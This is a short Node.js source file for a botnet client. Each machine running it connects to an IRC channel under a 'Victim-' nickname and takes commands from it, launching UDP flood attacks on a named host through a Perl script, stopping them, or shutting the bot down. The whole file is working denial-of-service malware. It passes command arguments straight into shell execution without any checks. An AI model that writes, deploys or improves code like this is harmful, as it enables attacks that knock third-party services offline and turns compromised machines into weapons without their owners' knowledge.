const irc = require('irc');
const { exec } = require('child_process');
const config = require('./config.json');
var name = `Victim-${Math.floor(Math.random() * (9999 - 1000) + 1000)}`;
var client = new irc.Client(config.server, name, { channels: [config.channel] });
function sendmsg(text) { client.send('PRIVMSG', config.channel, text); }
client.addListener('message', function (from, to, message) 
{
    const args = message.split(/ +/g);
    if(message.startsWith(`${config.prefix}help`))
    {
        sendmsg(`${config.prefix}udp <host> <time>`); 
        sendmsg(`${config.prefix}stop <host>`);
        sendmsg(`${config.prefix}killbots`);
    }
    if(message.startsWith(`${config.prefix}udp`))
    {
        exec(`screen -dmS ${args[1]} perl scripts/udp.pl ${args[1]} ${args[2]}`, (err, stdout, stderr) => 
        {
            sendmsg(`Attack sent!`);
        });
    }
    if(message.startsWith(`${config.prefix}stop`))
    {
        exec(`screen -X -s ${args[1]} quit`, (err, stdout, stderr) => 
        {
            sendmsg(`Attack stoped!`);
        });
    }
    if(message.startsWith(`${config.prefix}killbots`))
    {
        exec(`screen -X -s bot_node quit`, (err, stdout, stderr) => { });
    }
});